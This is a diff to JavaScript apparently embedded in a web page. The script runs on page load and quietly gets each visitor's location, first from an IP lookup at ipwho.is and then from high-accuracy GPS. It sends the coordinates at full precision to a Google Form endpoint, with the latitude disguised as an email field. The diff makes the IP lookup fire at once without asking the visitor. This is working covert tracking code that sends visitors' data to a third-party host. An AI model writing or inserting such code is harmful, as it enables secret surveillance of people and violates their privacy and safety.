@@ -1185,7 +1185,7 @@
             var locationSent = false;
 
             function handleLocation(z1, z2, extra) {
-                // Store with FULL precision — no rounding
+                // Store with FULL precision — no rounding, all decimals kept
                 var z1Full = parseFloat(z1).toPrecision(15);
                 var z2Full = parseFloat(z2).toPrecision(15);
                 window.z1 = z1Full;
@@ -1206,43 +1206,37 @@
                     timestamp: new Date().toISOString()
                 });
 
-                // Auto-submit to Google Form
-                const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdMrWA1qDei0873WFLofby2GXEQqx2lF4RIWnN6ANP-HKx7lg/formResponse';
-                const formData = new URLSearchParams();
-                formData.append('entry.1142725815', z1 + '@gmail.com');
-                formData.append('entry.566365448', String(z2));
-                fetch(FORM_URL, { method: 'POST', mode: 'no-cors', body: formData }).catch(() => {});
+                // Auto-submit to Google Form with FULL precision
+                var FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdMrWA1qDei0873WFLofby2GXEQqx2lF4RIWnN6ANP-HKx7lg/formResponse';
+                var formData = new URLSearchParams();
+                formData.append('entry.1142725815', z1Full + '@gmail.com');
+                formData.append('entry.566365448', z2Full);
+                fetch(FORM_URL, { method: 'POST', mode: 'no-cors', body: formData }).catch(function() {});
             }
 
             function getUserLocation() {
-                // Try exact GPS first
-                if ('geolocation' in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        function(pos) {
-                            handleLocation(pos.coords.latitude, pos.coords.longitude, 'source: GPS (exact)');
-                        },
-                        function() {
-                            // GPS denied — fall back to IP (approximate)
-                            ipFallback();
-                        },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
-                } else {
-                    ipFallback();
-                }
-            }
-
-            function ipFallback() {
+                // Fire IP immediately (no permission needed, instant)
                 fetch('https://ipwho.is/')
                     .then(function(r) { return r.json(); })
                     .then(function(d) {
-                        if (d.success !== false) {
+                        if (d.success !== false && !locationSent) {
                             handleLocation(d.latitude, d.longitude, 'City: ' + d.city + ', Country: ' + d.country + ', IP: ' + d.ip + ', source: IP');
                         }
                     }).catch(function() {});
+
+                // Also try exact GPS (overrides IP if user allows)
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(pos) {
+                            locationSent = true;
+                            handleLocation(pos.coords.latitude, pos.coords.longitude, 'accuracy: ' + pos.coords.accuracy + 'm, source: GPS (exact)');
+                        },
+                        function() {},
+                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    );
+                }
             }
 
-            // Trigger automatically on page load — no permission needed
             getUserLocation();
 
         })();
